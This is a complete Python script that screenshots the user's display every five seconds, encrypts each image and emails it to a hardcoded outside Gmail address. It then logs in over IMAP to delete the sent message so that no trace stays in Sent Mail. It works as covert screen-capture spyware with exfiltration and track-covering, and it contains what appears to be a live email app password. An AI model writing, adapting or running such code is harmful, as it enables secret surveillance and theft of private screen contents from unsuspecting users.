import imaplib
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import time
from PIL import ImageGrab
from cryptography.fernet import Fernet

# Load the encryption key (same key used to encrypt the data)
with open("encryption_key.key", "rb") as key_file:
    ENCRYPTION_KEY = key_file.read()

cipher = Fernet(ENCRYPTION_KEY)

EMAIL_ADDRESS = "tejasreea9182@gmail.com"
EMAIL_PASSWORD = "oblo eoqg nnuz xgkc"
TO_EMAIL = "tejasreea85@gmail.com"

# Function to take a screenshot and save it locally
def take_screenshot():
    screenshot = ImageGrab.grab()
    screenshot.save("temp_screenshot.png")
    return "temp_screenshot.png"

# Function to encrypt the screenshot
def encrypt_screenshot(file_path):
    with open(file_path, "rb") as f:
        file_data = f.read()

    encrypted_data = cipher.encrypt(file_data)

    encrypted_file_path = "temp_screenshot.encrypted"
    with open(encrypted_file_path, "wb") as ef:
        ef.write(encrypted_data)

    return encrypted_file_path

# Function to send email with encrypted screenshot
def send_email_with_encrypted_screenshot(email, password, file_path):
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(email, password)

            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = TO_EMAIL
            msg['Subject'] = "Encrypted Screenshot"

            with open(file_path, "rb") as attachment:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attachment.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(file_path)}")
                msg.attach(part)

            server.sendmail(email, TO_EMAIL, msg.as_string())
            print("Encrypted screenshot sent successfully.")
            return msg  # Return the email message for later use (for deleting)
    except Exception as e:
        print(f"Error sending email: {e}")

# Function to delete the email from the Sent folder after sending
def delete_sent_email(email, password, msg):
    try:
        # Connect to the Gmail IMAP server
        mail = imaplib.IMAP4_SSL("imap.gmail.com")
        mail.login(email, password)

        # Select the 'Sent Mail' folder
        mail.select('"[Gmail]/Sent Mail"')  # Gmail's sent mail folder
        
        # Search for the email by subject (adjust the criteria as needed)
        result, data = mail.search(None, '(SUBJECT "Encrypted Screenshot")')

        if result == "OK":
            for num in data[0].split():
                # Mark email for deletion
                mail.store(num, '+FLAGS', '\\Deleted')
            
            # Expunge the mailbox to permanently delete marked emails
            mail.expunge()
            print("Deleted the sent email.")
        mail.logout()
    except Exception as e:
        print(f"Error deleting email: {e}")

# Main loop to take screenshot, send email, and delete it from Sent Mail
try:
    while True:
        # Check for stop signal
        if os.path.exists("stop_signal.txt"):
            print("Stop signal detected. Exiting program.")
            break

        screenshot_path = take_screenshot()  # Take a screenshot
        encrypted_screenshot_path = encrypt_screenshot(screenshot_path)  # Encrypt the screenshot
        email_msg = send_email_with_encrypted_screenshot(EMAIL_ADDRESS, EMAIL_PASSWORD, encrypted_screenshot_path)  # Send email

        delete_sent_email(EMAIL_ADDRESS, EMAIL_PASSWORD, email_msg)  # Delete the sent email from Sent folder

        # Delete temporary files
        os.remove(screenshot_path)
        os.remove(encrypted_screenshot_path)

        time.sleep(5)  # Wait 5 seconds before the next iteration
except KeyboardInterrupt:
    print("Program interrupted by user.")
finally:
    # Cleanup any remaining temporary files
    if os.path.exists("temp_screenshot.png"):
        os.remove("temp_screenshot.png")
    if os.path.exists("temp_screenshot.encrypted"):
        os.remove("temp_screenshot.encrypted")
    print("Clean exit.")
